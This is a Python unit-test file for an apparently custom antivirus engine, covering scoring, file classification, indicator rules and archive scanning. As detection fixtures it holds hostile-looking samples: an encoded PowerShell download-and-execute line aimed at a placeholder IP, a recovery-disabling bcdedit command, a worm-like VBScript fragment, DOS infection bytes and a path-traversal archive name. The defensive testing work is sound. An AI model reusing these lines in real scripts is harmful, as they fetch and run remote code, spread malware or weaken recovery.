# Purpose: Verify scoring, generalized indicators and archive reach with inert generated fixtures.
# Works with: detection.threat_score, detection.indicators, detection.engine, detection.archive_inspection
# Used by: test.ps1

"""Verify scoring, generalized indicators and archive reach with inert generated fixtures. No malware is involved."""
import base64
import gzip
import io
import struct
import tempfile
import unittest
import zipfile
from pathlib import Path

from sentinelav.detection.archive_inspection import inspect_archive
from sentinelav.detection.engine import Scanner
from sentinelav.detection.file_types import classify
from sentinelav.detection.indicators import dos,documents,scripts,strings
from sentinelav.detection.threat_score import arm_scores,automatic_eligible,indicator,score
from sentinelav.paths import RESOURCE_ROOT

# Assembled at runtime so no EICAR string is stored on disk where host antivirus would remove the test.
TEST_MARKER=b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$'+b'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'


def zipped(*entries):
    raw=io.BytesIO()
    with zipfile.ZipFile(raw,'w',zipfile.ZIP_DEFLATED) as archive:
        for name,value in entries:archive.writestr(name,value)
    return raw.getvalue()


def heuristic(group,weight,category=''):
    return indicator(group+'_trait',group,weight,'Fixture trait',category=category)


class ScoringTests(unittest.TestCase):
    def test_one_group_cannot_reach_malicious_however_many_traits_it_has(self):
        for group in ('packing','structure','injection','download','ml'):
            result=score([heuristic(group,40) for _ in range(9)])
            self.assertLess(result['score'],70,group)

    def test_independent_groups_reach_malicious_with_high_confidence(self):
        result=score([heuristic('injection',38,'Injector'),heuristic('packing',20),heuristic('persistence',20)],'Win32')
        self.assertEqual(result['verdict'],'Malicious')
        self.assertEqual(result['confidence'],'High')
        self.assertEqual(result['threat_name'],'Heuristic.Win32.Injector')
        self.assertTrue(result['reasons'])

    def test_exact_identity_is_decisive_and_survives_a_trusted_signature(self):
        item=indicator('hash_match','identity',100,'SHA-256: fixture','hash')
        result=score([item],trusted=True)
        self.assertEqual((result['score'],result['verdict'],result['confidence']),(100,'Malicious','High'))
        self.assertTrue(automatic_eligible(dict(result,trusted_signature=False)))

    def test_trusted_signature_keeps_heuristics_below_suspicious(self):
        items=[heuristic(name,40) for name in ('injection','packing','persistence','download')]
        self.assertEqual(score(items)['verdict'],'Malicious')
        self.assertEqual(score(items,trusted=True)['verdict'],'Clean')

    def test_a_learned_model_can_still_flag_a_signed_file(self):
        items=[indicator('model','ml',55,'Model','ml'),heuristic('injection',45),heuristic('packing',35)]
        self.assertNotEqual(score(items,trusted=True)['verdict'],'Clean')

    def test_automatic_quarantine_needs_high_score_high_confidence_and_no_signature(self):
        self.assertFalse(automatic_eligible(dict(verdict='Malicious',score=84,confidence='High')))
        self.assertFalse(automatic_eligible(dict(verdict='Malicious',score=90,confidence='Medium')))
        self.assertFalse(automatic_eligible(dict(verdict='Suspicious',score=69,confidence='High')))
        self.assertFalse(automatic_eligible(dict(verdict='Malicious',score=90,confidence='High',trusted_signature=True)))
        self.assertTrue(automatic_eligible(dict(verdict='Malicious',score=85,confidence='High')))

    def test_evaluation_arms_isolate_each_layer(self):
        items=[indicator('hash_match','identity',100,'SHA-256: x','hash'),indicator('model','ml',55,'Model','ml'),heuristic('packing',20)]
        arms=arm_scores(items)
        self.assertEqual(arms['full']['score'],100)
        self.assertEqual(arms['generalized']['score'],75)
        self.assertEqual(arms['heuristic']['score'],20)


class ClassificationTests(unittest.TestCase):
    def test_content_decides_the_type_rather_than_the_name(self):
        self.assertEqual(classify(b'\x7fELF'+b'\0'*60,'.txt')['kind'],'elf')
        self.assertEqual(classify(b'%PDF-1.7\n','.exe')['kind'],'pdf')
        self.assertEqual(classify(b'MZ'+b'\0'*100,'.bin')['kind'],'dos_mz')
        self.assertEqual(classify(zipped(('AndroidManifest.xml','x'),('classes.dex','y')),'.zip')['kind'],'apk')
        self.assertEqual(classify(b'Set s=CreateObject("WScript.Shell")\nDim x\nOn Error Resume Next\n','.bin')['kind'],'vbscript')

    def test_ordinary_text_stays_inert(self):
        result=classify(b'Meeting notes for Tuesday.\n','.txt')
        self.assertEqual(result['kind'],'text')
        self.assertTrue(result['inert'])


class IndicatorTests(unittest.TestCase):
    def test_a_ransom_rule_needs_two_concepts_not_two_wordings(self):
        one=b'decrypt your files using the recover your files tool '*3
        self.assertNotIn('ransom_language',[i['code'] for i in strings.indicators(one)])
        both=b'all your files have been encrypted. send payment in bitcoin to the bitcoin address.'
        self.assertIn('ransom_language',[i['code'] for i in strings.indicators(both)])

    def test_private_addresses_are_not_raw_ip_evidence(self):
        self.assertFalse(strings.indicators(b'see http://192.168.1.10/status and http://127.0.0.1:80/ now'))
        self.assertTrue(strings.indicators(b'fetch http://203.0.113.9/a.bin right now'))

    def test_concealed_powershell_is_decoded_before_judging(self):
        hidden=b'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.9/a")'
        data=b'powershell -enc '+base64.b64encode(hidden.decode().encode('utf-16le'))
        codes=[i['code'] for i in scripts.indicators(data,'powershell')]
        self.assertIn('download_and_execute',codes)
        self.assertIn('content_concealment',codes)

    def test_ordinary_admin_scripts_stay_quiet(self):
        self.assertFalse(scripts.indicators(b'Get-ChildItem C:\\Logs | Remove-Item\nWrite-Host done\n','powershell'))
        self.assertFalse(scripts.indicators(b'import requests, subprocess\nrequests.get(url)\nsubprocess.run(["ls"])\n','python'))

    def test_pdf_actions_cannot_hide_behind_name_escapes(self):
        found=documents.pdf_indicators(b'%PDF-1.7\n<< /OpenAction 1 0 R /J#61vaScript 2 0 R >>')
        codes=[i['code'] for i in found]
        self.assertIn('pdf_auto_javascript',codes)
        self.assertIn('pdf_name_obfuscation',codes)

    def test_dos_infection_traits_are_described(self):
        program=b'\xe9'+struct.pack('<H',700)+b'\x90'*700+b'*.COM\x00\xb4\x4e\xcd\x21\xb8\x00\x42\xcd\x21\xb4\x40\xcd\x21'
        codes=[i['code'] for i in dos.indicators(program,'com')]
        self.assertIn('searches_for_programs',codes)
        self.assertIn('find_seek_write_sequence',codes)


class ScannerReachTests(unittest.TestCase):
    def setUp(self):
        self.temp=tempfile.TemporaryDirectory();self.root=Path(self.temp.name)
        (self.root/'signatures.json').write_text('{}')
        self.scanner=Scanner(self.root/'signatures.json',RESOURCE_ROOT/'rules',max_mb=1,options={'model':False,'neural_gray':False})

    def tearDown(self):
        self.scanner.signatures.close();self.temp.cleanup()

    def scan(self,name,data):
        target=self.root/name;target.write_bytes(data)
        return self.scanner.scan([target],lambda:False,lambda *a:None)

    def test_deep_archive_chain_is_reached_and_names_the_member(self):
        nested=zipped(('a.zip',zipped(('b.zip',zipped(('c.bin',TEST_MARKER))))))
        report=self.scan('outer.zip',nested)
        self.assertEqual(report['detections'][0]['member_chain'],['a.zip','b.zip','c.bin'])
        self.assertEqual(report['assessment']['score'],100)
        self.assertFalse(report['detections'][0]['automatic_response_eligible'])

    def test_compressed_streams_are_reached(self):
        self.assertTrue(self.scan('a.gz',gzip.compress(TEST_MARKER))['detections'])

    def test_seven_zip_members_are_reached(self):
        import py7zr
        raw=io.BytesIO()
        with py7zr.SevenZipFile(raw,'w') as archive:archive.writestr(TEST_MARKER,'hidden.bin')
        report=self.scan('a.7z',raw.getvalue())
        self.assertTrue(report['detections'],report['errors'])

    def test_decompression_bomb_is_bounded_and_counted_as_evidence(self):
        report=self.scan('bomb.zip',zipped(('big.bin',b'\0'*(8*1024*1024))))
        self.assertTrue(any('ratio' in error for error in report['errors']),report['errors'])
        self.assertIn('evasion',report['assessment']['groups'])

    def test_a_malformed_program_is_analyzed_rather_than_skipped(self):
        data=bytearray(1024);data[:2]=b'MZ';struct.pack_into('<I',data,0x3c,64);data[64:68]=b'PE\0\0'
        struct.pack_into('<HH',data,68,0x14c,90);struct.pack_into('<H',data,84,224)
        report=self.scan('broken.exe',bytes(data)+b'powershell -w hidden -enc AAAA bcdedit /set {default} recoveryenabled no')
        codes=[i['code'] for i in report['assessment']['indicators']]
        self.assertIn('malformed_pe',codes)
        self.assertIn('shadow_copy_deletion',codes)

    def test_padding_past_the_size_limit_does_not_hide_a_marker(self):
        report=self.scan('large.bin',TEST_MARKER+b'\0'*(2*1024*1024))
        self.assertTrue(report['detections'],report['errors'])
        self.assertTrue(report['detections'][0]['oversized'])
        self.assertTrue(any('start and end' in error for error in report['errors']))

    def test_every_file_in_a_folder_scan_is_scored(self):
        folder=self.root/'many';folder.mkdir()
        (folder/'plain.txt').write_text('ordinary notes')
        (folder/'bad.vbs').write_bytes(b'Set f=CreateObject("Scripting.FileSystemObject")\r\nf.CopyFile WScript.ScriptFullName,"C:\\x.vbs"\r\nSet o=CreateObject("Outlook.Application")\r\nSet m=o.GetNameSpace("MAPI").AddressLists(1)\r\n')
        report=self.scanner.scan([folder],lambda:False,lambda *a:None)
        self.assertEqual(report['scanned'],2)
        found=report['detections']+report['suspicious']
        self.assertEqual(len(found),1)
        self.assertTrue(found[0]['path'].endswith('bad.vbs'))
        self.assertGreaterEqual(found[0]['score'],35)

    def test_restart_position_skips_exactly_the_processed_files(self):
        folder=self.root/'resume';folder.mkdir()
        for name in 'abc':(folder/(name+'.txt')).write_text('ordinary')
        seen=[]
        self.scanner.file_started=lambda index,path:seen.append(Path(path).name)
        report=self.scanner.scan([folder],lambda:False,lambda *a:None,skip=1)
        self.assertEqual(seen,['b.txt','c.txt'])
        self.assertEqual(report['scanned'],2)


class ArchiveLimitTests(unittest.TestCase):
    def test_hostile_member_names_are_still_inspected_in_memory(self):
        seen=[]
        def analyze(payload,name):
            seen.append(payload);return [],[],[]
        _,omissions,_=inspect_archive(zipped(('../../evil.exe',b'content')),analyze)
        self.assertEqual(seen,[b'content'])
        self.assertTrue(any('Unsafe' in item for item in omissions))

    def test_entry_limit_is_reported(self):
        _,omissions,_=inspect_archive(zipped(*[(f'{i}.txt','x') for i in range(5)]),lambda p,n:([],[],[]),max_entries=2)
        self.assertIn('Archive entry limit reached',omissions)
